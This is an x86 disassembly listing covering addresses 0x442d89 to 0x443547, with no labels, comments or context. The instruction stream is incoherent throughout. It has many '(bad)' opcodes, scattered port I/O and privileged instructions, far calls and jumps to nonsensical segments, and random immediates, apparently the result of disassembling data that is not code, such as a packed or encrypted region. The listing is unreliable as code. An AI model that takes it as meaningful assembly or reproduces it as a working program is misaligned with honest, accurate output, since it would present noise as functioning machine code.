  442d89:	sar    DWORD PTR [ecx],cl
  442d8b:	xor    al,0xfb
  442d8d:	fadd   DWORD PTR [ebx]
  442d8f:	cld    
  442d90:	mov    ecx,ecx
  442d92:	mov    al,ds:0x41e7599b
  442d97:	outs   dx,BYTE PTR ds:[esi]
  442d98:	jle    0x442d9c
  442d9a:	mov    edx,0x9478e427
  442d9f:	push   edx
  442da0:	dec    ecx
  442da1:	cli    
  442da2:	cwde   
  442da3:	add    esp,DWORD PTR [ebx+eax*1]
  442da6:	loope  0x442d64
  442da8:	xchg   ebp,eax
  442da9:	pusha  
  442daa:	lahf   
  442dab:	stos   DWORD PTR es:[edi],eax
  442dac:	bound  esp,QWORD PTR [edi]
  442dae:	out    dx,al
  442daf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442db0:	pop    ecx
  442db1:	mov    bh,0x5f
  442db3:	ss jno 0x442d8b
  442db6:	sub    bh,cl
  442db8:	jle    0x442e38
  442dba:	pushf  
  442dbb:	icebp  
  442dbc:	sub    BYTE PTR [edx+0xb],0x98
  442dc0:	mov    bh,bh
  442dc2:	push   edi
  442dc3:	xor    al,0x24
  442dc5:	mov    ebp,0xe582d5de
  442dca:	jbe    0x442d55
  442dcc:	xchg   esi,eax
  442dcd:	out    0x77,al
  442dcf:	cli    
  442dd0:	mov    DWORD PTR [ebx+0x2b],edi
  442dd3:	out    dx,al
  442dd4:	shl    BYTE PTR [ebp+0x1cce5896],cl
  442dda:	mov    ?,WORD PTR [ecx]
  442ddc:	fadd   DWORD PTR [ecx+0xd285e3d]
  442de2:	inc    ebx
  442de3:	jnp    0x442d6d
  442de5:	jnp    0x442e1b
  442de7:	repz add DWORD PTR [ecx-0x29057352],0xf20ad5d2
  442df2:	adc    edx,0x98a1f386
  442df8:	mov    DWORD PTR ds:0x2959088a,edx
  442dfe:	cli    
  442dff:	jnp    0x442da7
  442e01:	mov    ebp,esp
  442e03:	retf   
  442e04:	mov    al,al
  442e06:	lds    esp,FWORD PTR [ebx+0x2795f8f7]
  442e0c:	mov    DWORD PTR [ebp-0x50f9455d],esi
  442e12:	cmp    BYTE PTR [edi-0x63fc3cfe],dl
  442e18:	xor    eax,0xc9b6f9ae
  442e1d:	pop    esi
  442e1e:	gs jo  0x442da9
  442e21:	ja     0x442dbe
  442e23:	cmp    BYTE PTR [ebp-0x60],dh
  442e26:	pop    ecx
  442e27:	dec    esi
  442e28:	lea    eax,ds:0x8ed7625e
  442e2e:	sub    ebp,DWORD PTR [edx]
  442e30:	and    edi,DWORD PTR [eax]
  442e32:	jge    0x442e57
  442e34:	inc    ecx
  442e35:	dec    ecx
  442e36:	data16 aad 0x3f
  442e39:	add    dl,BYTE PTR [ecx-0x59c89708]
  442e3f:	call   0xe8b8:0xa1440345
  442e46:	ds dec esp
  442e48:	mov    eax,DWORD PTR [ecx]
  442e4a:	xor    bl,BYTE PTR [ecx+0x24]
  442e4d:	xchg   edx,eax
  442e4e:	in     eax,0x40
  442e50:	pusha  
  442e51:	arpl   si,bp
  442e53:	aam    0x67
  442e55:	mov    ds:0x3ade1f7f,eax
  442e5a:	mov    al,ds:0x11398857
  442e5f:	enter  0x73b3,0x8
  442e63:	inc    edi
  442e64:	(bad)  
  442e65:	(bad)  
  442e66:	out    0xb9,eax
  442e68:	(bad)  
  442e69:	ins    DWORD PTR es:[edi],dx
  442e6a:	pop    es
  442e6b:	loopne 0x442e02
  442e6d:	retf   0xd722
  442e70:	and    al,BYTE PTR [esi-0x297121d]
  442e76:	pusha  
  442e77:	pop    ds
  442e78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442e79:	imul   edx,DWORD PTR [ebx+0x21b2132b],0xc8e25ede
  442e83:	aam    0xec
  442e85:	arpl   WORD PTR [esi],si
  442e87:	jbe    0x442e71
  442e89:	sbb    cl,BYTE PTR [ebp+0x3cdf88b8]
  442e8f:	jp     0x442ebb
  442e91:	repz rcl BYTE PTR [ecx],cl
  442e94:	imul   ecx,DWORD PTR [ebp+0x3a888b8d],0xffffffa4
  442e9b:	mov    edi,0xcc604b82
  442ea0:	lea    ebp,[ecx+0x7d]
  442ea3:	or     edx,DWORD PTR [ecx]
  442ea5:	mov    edx,0x93c01432
  442eaa:	or     edx,esp
  442eac:	mov    dl,0xd3
  442eaf:	sbb    al,0xb4
  442eb1:	inc    eax
  442eb2:	out    0x30,al
  442eb4:	mov    bh,0x21
  442eb6:	adc    eax,0xe0ea095c
  442ebb:	mov    ebp,0xf7eeb7a3
  442ec0:	daa    
  442ec1:	add    dh,BYTE PTR [eax-0x65]
  442ec4:	jno    0x442ec7
  442ec6:	ret    
  442ec7:	and    BYTE PTR [edi+0x53900137],dl
  442ecd:	addr16 mov esi,0xbe023424
  442ed3:	cwde   
  442ed4:	(bad)
  442ed8:	cld    
  442ed9:	mov    esp,DWORD PTR [eax-0x11]
  442edc:	and    al,0x7c
  442ede:	(bad)  
  442edf:	(bad)  
  442ee0:	fcom   DWORD PTR [edi+0x6af4d4c0]
  442ee6:	imul   esp,ebp,0x5e0ca3d4
  442eec:	mov    DWORD PTR ds:0x4a863ac2,esi
  442ef2:	adc    dh,bl
  442ef4:	xchg   esp,eax
  442ef5:	add    cl,BYTE PTR [eax+ebx*1]
  442ef8:	out    dx,al
  442ef9:	mov    cl,0xfd
  442efb:	scas   al,BYTE PTR es:[edi]
  442efc:	nop
  442efd:	rol    DWORD PTR [ebx+ecx*4],0x96
  442f01:	or     eax,0x64fa971d
  442f06:	dec    edi
  442f07:	sti    
  442f08:	inc    esi
  442f09:	rcr    ch,0x1d
  442f0c:	cmc    
  442f0d:	or     BYTE PTR [eax],cl
  442f0f:	div    DWORD PTR [esi]
  442f11:	jae    0x442e9f
  442f13:	call   0x49c9:0x6dd4ea97
  442f1a:	fbld   TBYTE PTR [eax-0x49]
  442f1d:	nop
  442f1e:	mov    edi,0xefb5897a
  442f23:	idiv   DWORD PTR [ebp+0x4c]
  442f26:	mov    dh,0xdf
  442f28:	mov    ecx,0x83809802
  442f2d:	mov    edi,esp
  442f2f:	scas   eax,DWORD PTR es:[edi]
  442f30:	or     al,0x6f
  442f32:	push   ds
  442f33:	cmovo  ebx,esp
  442f36:	js     0x442edf
  442f38:	les    edx,FWORD PTR ds:0xc00fd2e0
  442f3e:	ins    DWORD PTR es:[edi],dx
  442f3f:	sub    ebx,DWORD PTR [edx-0x75]
  442f42:	push   ebp
  442f43:	dec    esi
  442f44:	or     DWORD PTR [ebp-0x21],ebp
  442f47:	in     eax,dx
  442f48:	mov    cl,bh
  442f4a:	or     bl,BYTE PTR [ecx-0x66a22dcd]
  442f50:	rcr    BYTE PTR [edi],cl
  442f52:	push   eax
  442f53:	xchg   esp,eax
  442f54:	arpl   WORD PTR [ebx+ecx*8-0x5b],ax
  442f58:	cdq    
  442f59:	(bad)  
  442f5a:	fild   WORD PTR [ebx]
  442f5c:	push   esp
  442f5d:	pop    edi
  442f5e:	pop    ds
  442f5f:	sbb    DWORD PTR [edi+eax*1-0x19a45f6a],esp
  442f66:	test   DWORD PTR [ecx+esi*4],0xc3cd6053
  442f6d:	in     eax,dx
  442f6e:	arpl   WORD PTR [ecx-0x1],dx
  442f71:	popf   
  442f72:	out    0xbc,al
  442f74:	mov    BYTE PTR [ebp+0x52],ch
  442f77:	mov    ah,0x6e
  442f79:	sbb    al,0x22
  442f7b:	push   0x964a1d50
  442f80:	ins    DWORD PTR es:[edi],dx
  442f81:	xchg   DWORD PTR [eax],esi
  442f83:	call   0x2b89:0xc4ed0ed9
  442f8a:	retf   
  442f8b:	mov    ecx,0x1a5cd171
  442f90:	mov    BYTE PTR [edi-0x50],0x18
  442f94:	lods   al,BYTE PTR ds:[esi]
  442f95:	add    eax,0x959bf897
  442f9a:	mov    edx,0xe56d88f8
  442f9f:	push   cs
  442fa0:	add    BYTE PTR [esi+eiz*1+0xe05cb03],0xa
  442fa8:	xchg   BYTE PTR [esi+0x55],ah
  442fab:	push   esp
  442fac:	xchg   edi,eax
  442fad:	jbe    0x44302a
  442faf:	(bad)  
  442fb1:	jge    0x442f98
  442fb3:	xchg   ebp,eax
  442fb4:	ror    edx,cl
  442fb6:	push   edi
  442fb7:	in     eax,0xa2
  442fb9:	mov    ch,0xf9
  442fbb:	jg     0x442f45
  442fbd:	sbb    edx,edx
  442fbf:	fcomip st,st(2)
  442fc1:	ret    
  442fc2:	imul   ecx,DWORD PTR [ebp+0x71],0x62
  442fc6:	fwait
  442fc7:	imul   DWORD PTR [edi-0x74851afb]
  442fcd:	sub    esi,esp
  442fcf:	stos   DWORD PTR es:[edi],eax
  442fd0:	sub    ecx,DWORD PTR [edx-0x60]
  442fd3:	iret   
  442fd4:	cli    
  442fd5:	adc    BYTE PTR [ecx-0x7f62423b],0x94
  442fdc:	mov    BYTE PTR [edi],bh
  442fde:	outs   dx,DWORD PTR ds:[esi]
  442fdf:	nop
  442fe0:	sub    DWORD PTR [edi-0x15e5e73f],ebp
  442fe6:	cmp    al,0xd4
  442fe8:	ret    0xb969
  442feb:	fbld   TBYTE PTR [esi]
  442fed:	fnstcw WORD PTR [ecx]
  442fef:	mov    BYTE PTR [ebx+0x8aa3421],dh
  442ff5:	sub    ah,BYTE PTR ds:0x448fd50e
  442ffb:	pop    eax
  442ffc:	sahf   
  442ffd:	retf   0x7866
  443000:	popf   
  443001:	sbb    BYTE PTR [edx],bh
  443003:	test   dh,0xa0
  443006:	pop    ecx
  443007:	out    0x3b,eax
  443009:	retf   0x3fc6
  44300c:	mov    DWORD PTR [ecx-0x1b],edx
  44300f:	inc    ebp
  443010:	mov    ecx,0xaf926bce
  443015:	add    dl,dh
  443017:	dec    esp
  443018:	fwait
  443019:	test   dh,dh
  44301b:	cmp    BYTE PTR [ecx+eax*1+0x1e],ah
  44301f:	xor    edi,DWORD PTR [edi-0x3f]
  443022:	cmp    bh,BYTE PTR [edi]
  443024:	mov    edx,0xefa11373
  443029:	xlat   BYTE PTR ds:[ebx]
  44302a:	jns    0x443006
  44302c:	into   
  44302d:	jmp    0x99c27b8d
  443032:	mov    al,ds:0x60fef456
  443037:	inc    ecx
  443038:	jo     0x4430ad
  44303a:	add    eax,0x5cf572eb
  44303f:	(bad)  
  443040:	xchg   DWORD PTR [edx-0xd],eax
  443043:	push   eax
  443044:	sub    BYTE PTR [ecx-0x1fdb10f0],cl
  44304a:	inc    esi
  44304b:	xor    esi,0x49
  44304e:	fsubp  st(6),st
  443050:	scas   al,BYTE PTR es:[edi]
  443051:	add    eax,0xfa504df6
  443056:	sar    esp,0xb1
  443059:	sub    bl,BYTE PTR [esi]
  44305b:	sbb    eax,0x3fe98eee
  443060:	ds test al,0xa3
  443063:	aam    0x32
  443065:	and    BYTE PTR [ebp+0x52],0xdc
  443069:	fnstcw WORD PTR [esi-0x2a]
  44306c:	mov    BYTE PTR [ebp-0x6b991a2],ah
  443072:	and    DWORD PTR [ebp-0x21],ecx
  443075:	add    eax,0x3fe50128
  44307a:	out    dx,eax
  44307b:	outs   dx,DWORD PTR ds:[esi]
  44307c:	xchg   DWORD PTR [ebp-0x57],esp
  44307f:	pop    ebx
  443080:	or     al,0x3
  443082:	adc    bh,BYTE PTR [ecx-0x2c]
  443085:	dec    esi
  443086:	fcom   st(4)
  443088:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443089:	jle    0x4430bc
  44308b:	push   0x31
  44308d:	cmp    BYTE PTR [edi+0x59],bh
  443090:	icebp  
  443091:	sub    DWORD PTR ds:0x73e902d7,esp
  443097:	fdivr  QWORD PTR [eax-0x28]
  44309a:	add    al,0xd7
  44309c:	sub    DWORD PTR [edi+esi*2-0x3e],ebp
  4430a0:	(bad)  
  4430a1:	mov    edi,0xcb890067
  4430a6:	jle    0x44309a
  4430a8:	ss jne 0x443079
  4430ab:	mov    bh,0xd2
  4430ad:	and    al,0x82
  4430af:	es cdq 
  4430b1:	cmc    
  4430b2:	loopne 0x4430f1
  4430b4:	push   ecx
  4430b5:	(bad)
  4430ba:	stos   DWORD PTR es:[edi],eax
  4430bb:	cmp    BYTE PTR [ebp+ebx*2+0x12cd304],dh
  4430c2:	mov    dh,0x70
  4430c4:	in     al,0x88
  4430c6:	push   ebx
  4430c7:	and    bl,BYTE PTR [ebx+ebx*8]
  4430ca:	xchg   edx,eax
  4430cb:	std    
  4430cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4430cd:	fldenv [eax+ebp*2]
  4430d0:	mov    BYTE PTR [edi],ch
  4430d2:	add    BYTE PTR [edx-0x36],bl
  4430d5:	jge    0x4430ff
  4430d7:	mov    edx,0x305704e2
  4430dc:	enter  0x6f42,0xba
  4430e0:	imul   eax,DWORD PTR [esi],0x34c30b45
  4430e6:	ins    DWORD PTR es:[edi],dx
  4430e7:	(bad)  
  4430e8:	sahf   
  4430e9:	popf   
  4430ea:	mov    edi,0xa71936e1
  4430ef:	aad    0x39
  4430f1:	cli    
  4430f2:	mov    ch,0xb0
  4430f4:	dec    DWORD PTR [ebx+0xb8987f3]
  4430fa:	cmp    eax,0xcec7121e
  4430ff:	push   ds
  443100:	cmp    al,0x2
  443102:	repnz loop 0x44308f
  443105:	jns    0x44310a
  443107:	int3   
  443108:	iret   
  443109:	cld    
  44310a:	pusha  
  44310b:	mov    ch,0x5a
  44310d:	xchg   ecx,eax
  44310e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44310f:	fisubr DWORD PTR [edx+0xcd5a906]
  443115:	stos   BYTE PTR es:[edi],al
  443116:	retf   
  443117:	ins    BYTE PTR es:[edi],dx
  443118:	cmp    ebp,esi
  44311a:	pop    ds
  44311b:	enter  0x4c68,0x1f
  44311f:	mov    ebx,0x223f30d6
  443124:	cmc    
  443125:	imul   ebp,DWORD PTR [esp+esi*8+0x73d214e2],0x4
  44312d:	mov    edx,0x4af2f711
  443132:	lods   al,BYTE PTR ds:[esi]
  443133:	ja     0x4430e6
  443135:	xchg   ecx,eax
  443136:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443137:	dec    ebp
  443138:	mov    ss,edi
  44313a:	mov    eax,0xc097af8f
  44313f:	lods   al,BYTE PTR ds:[esi]
  443140:	xchg   BYTE PTR [ebp+eax*8+0x180d32d4],dh
  443147:	mov    BYTE PTR [ecx+edi*4],dh
  44314a:	cwde   
  44314b:	mov    ah,0xb0
  44314d:	or     DWORD PTR [edx+0x68],0xb
  443151:	cmp    BYTE PTR [edx],al
  443153:	addr16 jae 0x4430fb
  443156:	aas    
  443157:	retf   
  443158:	push   ss
  443159:	inc    edi
  44315a:	lods   al,BYTE PTR ds:[esi]
  44315b:	in     eax,0x82
  44315d:	test   DWORD PTR [edx+eax*2+0x13],eax
  443161:	xor    al,0x79
  443163:	cdq    
  443164:	push   ecx
  443165:	mov    cl,0xb7
  443167:	arpl   cx,si
  443169:	ins    DWORD PTR es:[edi],dx
  44316a:	push   ds
  44316b:	sbb    esi,esp
  44316d:	add    ah,BYTE PTR [ecx-0x3e]
  443170:	bound  eax,QWORD PTR [ebx]
  443172:	ret    0x42e3
  443175:	and    edx,DWORD PTR [edx+0x6005568d]
  44317b:	dec    edi
  44317c:	adc    DWORD PTR [edx-0x7b],esi
  44317f:	xchg   ecx,eax
  443180:	fist   DWORD PTR [esi-0x80dfb44]
  443186:	pusha  
  443187:	ins    DWORD PTR es:[edi],dx
  443188:	jne    0x4431d7
  44318a:	xchg   edi,eax
  44318b:	mov    bl,BYTE PTR [ebx+0x41]
  44318e:	call   0xead5:0xb389e8b1
  443195:	lods   eax,DWORD PTR ds:[esi]
  443196:	cs push es
  443198:	shl    BYTE PTR [edx],0x99
  44319b:	aam    0xe3
  44319d:	dec    edi
  44319e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44319f:	aad    0xa0
  4431a1:	inc    dh
  4431a3:	lahf   
  4431a4:	dec    ecx
  4431a5:	push   eax
  4431a6:	daa    
  4431a7:	out    0xd2,al
  4431a9:	jnp    0x443182
  4431ab:	aad    0x83
  4431ad:	mov    eax,ds:0x8f0bc02
  4431b2:	push   ds
  4431b3:	jne    0x44316c
  4431b5:	icebp  
  4431b6:	nop
  4431b7:	and    al,0x8
  4431b9:	mov    ebx,ss
  4431bb:	in     eax,0x7a
  4431bd:	sub    BYTE PTR [edi-0x49823b55],0xcd
  4431c4:	mov    eax,ds:0xc3f4f477
  4431c9:	les    esp,FWORD PTR [esi]
  4431cb:	dec    ecx
  4431cc:	mov    BYTE PTR [ebx-0x72e23d11],dh
  4431d2:	or     al,0xf5
  4431d4:	pop    eax
  4431d5:	add    bh,al
  4431d7:	hlt    
  4431d8:	push   edi
  4431d9:	leave  
  4431da:	jne    0x44324d
  4431dc:	(bad)  
  4431dd:	pusha  
  4431de:	push   ds
  4431df:	outs   dx,DWORD PTR ds:[esi]
  4431e0:	or     cl,0xdd
  4431e3:	into   
  4431e4:	dec    esi
  4431e5:	fadd   QWORD PTR [edx-0x2b]
  4431e8:	adc    DWORD PTR [eax-0x2edbb575],ebx
  4431ee:	jecxz  0x4431ee
  4431f0:	stc    
  4431f1:	pop    ss
  4431f2:	in     eax,0xd5
  4431f4:	mov    bl,0xc5
  4431f6:	gs sbb ecx,esi
  4431f9:	cmp    eax,0xb514d443
  4431fe:	mov    ebx,0x49431130
  443203:	xor    eax,0xccb61d8a
  443208:	push   0x3142627b
  44320d:	jecxz  0x4431da
  44320f:	retf   0x263
  443212:	dec    edx
  443213:	sub    al,0xc3
  443215:	xchg   edx,eax
  443216:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443217:	and    al,0x37
  443219:	outs   dx,BYTE PTR ds:[esi]
  44321a:	jge    0x443243
  44321c:	dec    ebx
  44321d:	popf   
  44321e:	cmp    al,0x11
  443220:	mov    dl,0x4c
  443222:	fs dec ebx
  443224:	xor    cl,bh
  443226:	xor    al,0xd4
  443228:	and    ch,BYTE PTR [edi+0x75cc23b1]
  44322e:	sub    eax,0x658d89d6
  443233:	mov    eax,0x26dd5d8d
  443238:	push   cs
  443239:	add    ch,BYTE PTR [ecx+ebp*4+0x4a73bc69]
  443240:	push   ebx
  443241:	fs push ds
  443243:	out    dx,eax
  443244:	xchg   BYTE PTR [eax+0x29],ah
  443247:	add    DWORD PTR [esi],ebx
  443249:	xchg   edi,eax
  44324a:	mov    ebx,edx
  44324c:	lock aaa 
  44324e:	jo     0x4431fa
  443250:	xor    BYTE PTR [ebp+0x73e150ff],cl
  443256:	dec    esi
  443257:	sbb    cl,BYTE PTR [ecx+edi*8-0xff36c9c]
  44325e:	xchg   edi,eax
  44325f:	pop    ss
  443260:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443261:	sbb    DWORD PTR [edi],ebp
  443263:	dec    ebx
  443264:	in     al,dx
  443265:	cmp    eax,0x6a144b2e
  44326a:	pop    ds
  44326b:	inc    ebx
  44326c:	dec    ecx
  44326d:	loop   0x443267
  44326f:	aas    
  443270:	sti    
  443271:	mov    dh,0x7b
  443273:	idiv   DWORD PTR [esi]
  443275:	cmp    eax,0x83881f3b
  44327a:	leave  
  44327b:	retf   
  44327c:	nop
  44327d:	rol    BYTE PTR [edi+ebx*4+0x547a59d3],1
  443284:	jne    0x4432f1
  443286:	sbb    eax,0xf8a6751e
  44328b:	cmp    eax,ebp
  44328d:	add    eax,0x5c10c274
  443292:	lds    ecx,FWORD PTR [esi+esi*4]
  443295:	es jb  0x44330e
  443298:	(bad)
  44329b:	push   edi
  44329c:	sub    al,0xc8
  44329e:	cmp    bl,bh
  4432a0:	mov    BYTE PTR [edi-0x4450b85d],ch
  4432a6:	dec    esi
  4432a7:	aad    0x61
  4432a9:	add    ah,BYTE PTR [edx]
  4432ab:	(bad)  
  4432ac:	(bad)  [ebx]
  4432ae:	(bad)  
  4432af:	out    0xc1,eax
  4432b1:	jmp    0xcbd424c8
  4432b6:	inc    edx
  4432b7:	cwde   
  4432b8:	xor    al,0x70
  4432ba:	es daa 
  4432bc:	xchg   edx,eax
  4432bd:	cmp    ebx,edi
  4432bf:	aad    0x29
  4432c1:	sub    esi,DWORD PTR [edi]
  4432c3:	or     ebx,0xb4d0422f
  4432c9:	jnp    0x4432fb
  4432cb:	mov    ah,0x88
  4432cd:	sar    BYTE PTR [esi],cl
  4432cf:	call   0x20f7:0xd5bc085c
  4432d6:	dec    esp
  4432d7:	ds ja  0x4432cd
  4432da:	or     esp,0xfffffff2
  4432dd:	sub    eax,0x2a76d65c
  4432e2:	xchg   edi,eax
  4432e3:	or     eax,0x73289749
  4432e8:	fadd   DWORD PTR [esi+0x27c5841]
  4432ee:	adc    cl,cl
  4432f0:	mov    esi,0x94224437
  4432f5:	sub    ecx,DWORD PTR [ecx+ebp*2+0x4b]
  4432f9:	nop
  4432fa:	pop    eax
  4432fb:	mov    ds:0x34d61c88,eax
  443300:	fisubr WORD PTR [edx+0x5077bbd3]
  443306:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443307:	jnp    0x443357
  443309:	mov    ecx,0x4738f3c7
  44330e:	inc    esi
  44330f:	dec    esi
  443310:	xchg   DWORD PTR [ecx+0x27],edx
  443313:	pop    ss
  443314:	mov    ch,0xf8
  443316:	mov    ds:0x75836c1e,eax
  44331b:	jnp    0x44329e
  44331d:	or     al,0x71
  44331f:	gs fucom st(3)
  443322:	leave  
  443323:	sbb    al,0x4a
  443325:	cmp    bl,BYTE PTR [esi]
  443327:	add    esp,DWORD PTR [ebx+esi*8]
  44332a:	int3   
  44332b:	fldenv [esi+ebx*1+0x348f71f]
  443332:	or     DWORD PTR [edx-0x32],ebx
  443335:	scas   eax,DWORD PTR es:[edi]
  443336:	loope  0x4432d3
  443338:	imul   esp,DWORD PTR [ecx-0xa],0x9def88db
  44333f:	xor    DWORD PTR [edi+0x42],0x5d897bd
  443346:	(bad)  
  443347:	jno    0x4432d4
  443349:	daa    
  44334a:	dec    esp
  44334b:	das    
  44334c:	inc    edx
  44334d:	shr    DWORD PTR [edi],1
  44334f:	popf   
  443350:	add    BYTE PTR [ecx],al
  443352:	mov    bh,0xcd
  443354:	mov    al,0x5
  443356:	inc    esi
  443357:	nop
  443358:	jmp    0x44333e
  44335a:	stos   DWORD PTR es:[edi],eax
  44335b:	and    eax,DWORD PTR [eax-0x55c8e1d8]
  443361:	pop    ss
  443362:	add    al,0x92
  443364:	jp     0x4433de
  443366:	cs (bad) 
  443368:	add    eax,0xdc467fdd
  44336d:	cmp    esp,DWORD PTR [ebx+0x1c]
  443370:	pop    ebx
  443371:	adc    DWORD PTR [ebp+0x7b],esp
  443374:	pxor   mm0,QWORD PTR [edi-0x1f77dcf3]
  44337b:	(bad)  
  44337c:	cmp    DWORD PTR [ebp-0x5ceba1c1],edi
  443382:	pop    ds
  443383:	cmp    si,WORD PTR [eax+0x46]
  443387:	cwde   
  443388:	xchg   esp,eax
  443389:	sbb    BYTE PTR [edi],0xbf
  44338c:	push   esp
  44338d:	jecxz  0x4433d5
  44338f:	jmp    0x443376
  443391:	call   0xe71f:0x69c52709
  443398:	mov    al,0xfa
  44339a:	(bad)  
  44339c:	popf   
  44339d:	push   edi
  44339e:	push   ds
  44339f:	ja     0x443383
  4433a1:	xor    al,0xd7
  4433a3:	(bad)  
  4433a4:	loopne 0x4433b9
  4433a6:	in     al,0xd5
  4433a8:	sbb    bl,BYTE PTR [ebp-0x66]
  4433ab:	loope  0x443382
  4433ad:	jne    0x4433b1
  4433af:	lds    eax,FWORD PTR [esi-0x620a22f]
  4433b5:	xchg   esp,eax
  4433b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4433b7:	(bad)
  4433ba:	test   edx,eax
  4433bc:	push   es
  4433bd:	add    ebp,DWORD PTR [eax-0x9]
  4433c0:	and    cl,BYTE PTR [ecx-0x79]
  4433c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4433c4:	inc    edi
  4433c5:	xchg   DWORD PTR [eax+0x3d],esp
  4433c8:	sub    al,0x27
  4433ca:	cmp    al,0xf9
  4433cc:	mov    cl,0x6b
  4433ce:	and    DWORD PTR ds:0x67a67f6f,0x52
  4433d5:	mov    BYTE PTR [edi],bl
  4433d7:	dec    ecx
  4433d8:	jno    0x4433f9
  4433da:	mov    bl,0x8d
  4433dc:	and    ecx,DWORD PTR [ebp-0x16fa8299]
  4433e2:	jge    0x443432
  4433e4:	mov    cs,WORD PTR [eax+0x2d]
  4433e7:	add    al,0x16
  4433e9:	push   0xb851d73d
  4433ee:	out    dx,eax
  4433ef:	retf   
  4433f0:	cmp    al,0x8d
  4433f2:	mov    dh,0x36
  4433f4:	mov    dl,0x93
  4433f6:	jns    0x4433ca
  4433f8:	icebp  
  4433f9:	add    eax,0x282e902a
  4433fe:	test   BYTE PTR [eax+eax*4+0x1d],ch
  443402:	cli    
  443403:	push   0xffffffbf
  443405:	into   
  443406:	mov    edx,esp
  443408:	test   DWORD PTR [ebx],0xd898e6f
  44340e:	jge    0x44341a
  443410:	mov    eax,0x9e81f1ac
  443415:	test   BYTE PTR [ebp-0x7a],bl
  443418:	jb     0x44341d
  44341a:	adc    al,0xa3
  44341c:	or     dl,BYTE PTR [ecx-0x14]
  44341f:	add    edx,DWORD PTR [esi]
  443421:	push   ebx
  443422:	or     eax,0x866b8792
  443427:	mov    esi,0xca0a969
  44342c:	xor    al,0x3e
  44342e:	icebp  
  44342f:	aam    0x97
  443431:	ror    DWORD PTR [edx],1
  443433:	xchg   DWORD PTR [edx-0x22],esi
  443436:	mov    bh,0x95
  443438:	lock ins DWORD PTR es:[edi],dx
  44343a:	jne    0x4433fe
  44343c:	mov    ebp,ebx
  44343e:	jmp    0x443462
  443440:	aas    
  443441:	jg     0x44347c
  443443:	jb     0x44340f
  443445:	push   cs
  443446:	push   0xda9545aa
  44344b:	shl    DWORD PTR [ebp+0x49095be5],1
  443451:	mov    WORD PTR [eax+0x67],fs
  443454:	icebp  
  443455:	push   ebp
  443456:	pushf  
  443457:	lock ret 0xd32f
  44345b:	aad    0x56
  44345d:	(bad)  
  44345f:	lea    ebx,[esi]
  443461:	cli    
  443462:	add    eax,0xffffff88
  443465:	and    DWORD PTR [ebp+edx*2-0x4c],ebx
  443469:	sub    BYTE PTR [ebx+0x1f],0x2d
  44346d:	add    bh,BYTE PTR [esi-0x664a6e99]
  443473:	mov    ch,0x8d
  443475:	or     al,0x1f
  443477:	xorps  xmm4,XMMWORD PTR [ebp-0x4b]
  44347b:	rol    eax,cl
  44347d:	(bad)  
  44347e:	pushf  
  44347f:	aam    0xc5
  443481:	cmp    al,0x3
  443483:	test   al,0xc7
  443485:	dec    ebp
  443486:	jnp    0x44344e
  443488:	mov    ah,0xfb
  44348a:	dec    ebx
  44348b:	push   ds
  44348c:	pop    es
  44348d:	or     dh,BYTE PTR [esp+eax*8]
  443490:	sub    BYTE PTR [eax+0x6d],dh
  443493:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443494:	push   ds
  443495:	add    dh,BYTE PTR [edx+0x5c]
  443498:	dec    edx
  443499:	pop    esp
  44349a:	(bad)  
  44349b:	mov    eax,ds:0xcb1f3f41
  4434a0:	jmp    0x2f4d:0xb25fb39d
  4434a7:	aam    0x45
  4434a9:	pop    ss
  4434aa:	inc    edi
  4434ab:	dec    edi
  4434ac:	fadd   DWORD PTR [ebp+0x1d88183e]
  4434b2:	adc    eax,0xe0183b63
  4434b7:	xchg   BYTE PTR [edi+0x3],al
  4434ba:	hlt    
  4434bb:	scas   eax,DWORD PTR es:[edi]
  4434bc:	cmp    DWORD PTR [ebx],ecx
  4434be:	xchg   edi,eax
  4434bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4434c0:	enter  0x6596,0xfd
  4434c4:	popf   
  4434c5:	jmp    0x724e:0xe2b419cd
  4434cc:	mov    bl,0x2
  4434ce:	shr    BYTE PTR [edx],1
  4434d0:	bound  edx,QWORD PTR [eax-0x71]
  4434d3:	ret    
  4434d4:	aas    
  4434d5:	outs   dx,DWORD PTR ds:[esi]
  4434d6:	push   ds
  4434d7:	pop    ss
  4434d8:	jge    0x4434e1
  4434da:	xlat   BYTE PTR ds:[ebx]
  4434db:	or     esp,ebp
  4434dd:	add    eax,0xb4fe9d81
  4434e2:	mov    WORD PTR [ebp-0x69],ss
  4434e5:	lods   al,BYTE PTR ds:[esi]
  4434e6:	ret    0x8496
  4434e9:	neg    BYTE PTR [edi]
  4434eb:	xor    eax,0xf1b93893
  4434f0:	loop   0x44352e
  4434f2:	in     eax,dx
  4434f3:	mov    edx,0xff981bc1
  4434f8:	repnz add eax,0x2c05a78b
  4434fe:	dec    esi
  4434ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443500:	xor    ecx,0x76
  443503:	jp     0x443575
  443505:	sbb    BYTE PTR [edi],0x1e
  443508:	cld    
  443509:	mov    bh,0x12
  44350b:	rol    BYTE PTR [ebx-0x4087fe0f],1
  443511:	adc    cl,ah
  443513:	jle    0x44353c
  443515:	xor    BYTE PTR [ebx],0x69
  443518:	fisub  DWORD PTR [bx+si+0x5b]
  44351c:	scas   eax,DWORD PTR es:[edi]
  44351d:	jmp    0xd714:0xc9341412
  443524:	pusha  
  443525:	data16 outs dx,BYTE PTR ds:[esi]
  443527:	and    dl,dh
  443529:	mov    al,ds:0x4588cefc
  44352e:	xor    DWORD PTR [eax+ebx*4-0x5b],ecx
  443532:	(bad)  
  443534:	cmp    DWORD PTR [edx],eax
  443536:	retf   0xc70c
  443539:	sub    DWORD PTR ds:0x1e65da2f,edx
  44353f:	imul   ecx,eax,0xffffff82
  443542:	cmp    al,0x56
  443544:	retf   
  443545:	daa    
  443546:	ret    
  443547:	into   
